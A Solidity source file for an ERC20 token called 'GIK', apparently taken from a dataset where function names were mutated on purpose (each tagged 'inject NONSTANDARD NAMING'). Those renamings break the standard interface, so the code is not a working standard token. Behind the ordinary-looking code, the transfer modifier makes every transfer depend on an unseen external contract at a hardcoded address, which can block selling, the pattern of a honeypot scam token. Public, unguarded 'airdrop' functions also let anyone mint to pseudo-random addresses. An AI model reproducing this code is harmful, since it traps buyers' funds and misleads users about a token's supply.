                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY500() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF211(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER803(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE569(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE784(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM522(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER461(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL605(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function RECEIVEAPPROVAL328(address,address) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER206() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0x986F3c101F552b2524b6b92B27bdbfa79468c633;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY500() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF211(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    
    address luckyboy = address(this);
    uint256 constant lucky_amount428 = 5*10**18;	//inject NONSTANDARD NAMING
    
    function RANDOMLUCKY136() public {	//inject NONSTANDARD NAMING
        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));
        _balances[luckyboy] = lucky_amount428;
        _totalSupply += lucky_amount428;
        emit TRANSFER461(address(0), luckyboy, lucky_amount428);
    }
    
    function AIRDROP830(uint256 dropTimes) public {	//inject NONSTANDARD NAMING
        for (uint256 i=0;i<dropTimes;i++) {
            RANDOMLUCKY136();
        }
    }
    
    function TRANSFER803(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER145(_MSGSENDER206(), recipient, amount);
        return true;
    }
    
    
    function ALLOWANCE569(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE784(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE918(_MSGSENDER206(), spender, amount);
        return true;
    }

    function TRANSFERFROM522(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER145(sender, recipient, amount);
        _APPROVE918(sender, _MSGSENDER206(), _allowances[sender][_MSGSENDER206()].SUB146(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE76(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE918(_MSGSENDER206(), spender, _allowances[_MSGSENDER206()][spender].ADD834(addedValue));
        return true;
    }

    function DECREASEALLOWANCE214(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE918(_MSGSENDER206(), spender, _allowances[_MSGSENDER206()][spender].SUB146(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER145(address sender, address recipient, uint amount) internal ENSURE643(sender,recipient) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB146(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD834(amount);
        emit TRANSFER461(sender, recipient, amount);
        
    }

    function _MINT64(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD834(amount);
        _balances[account] = _balances[account].ADD834(amount);
        emit TRANSFER461(address(0), account, amount);
    }

    function _BURN614(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB146(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB146(amount);
        emit TRANSFER461(account, address(0), amount);
    }

    modifier ENSURE643(address sender,address to) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).RECEIVEAPPROVAL328(sender,to));
        _;
    }

    function _APPROVE918(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL605(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME412() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL201() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS297() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD834(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB146(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB146(a, b, "SafeMath: subtraction overflow");
    }

    function SUB146(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL217(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV730(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV730(a, b, "SafeMath: division by zero");
    }

    function DIV730(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT640(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER281(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN952(token, abi.encodeWithSelector(token.TRANSFER803.selector, to, value));
    }

    function SAFETRANSFERFROM939(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN952(token, abi.encodeWithSelector(token.TRANSFERFROM522.selector, from, to, value));
    }

    function SAFEAPPROVE931(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE569(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN952(token, abi.encodeWithSelector(token.APPROVE784.selector, spender, value));
    }

    function CALLOPTIONALRETURN952(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT640(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract GIK is ERC20, ERC20Detailed {
    constructor() public ERC20Detailed("GIK","GIK",18) {
        _MINT64(msg.sender, 10000 * 10 ** 18);
        AIRDROP830(50);
    }

}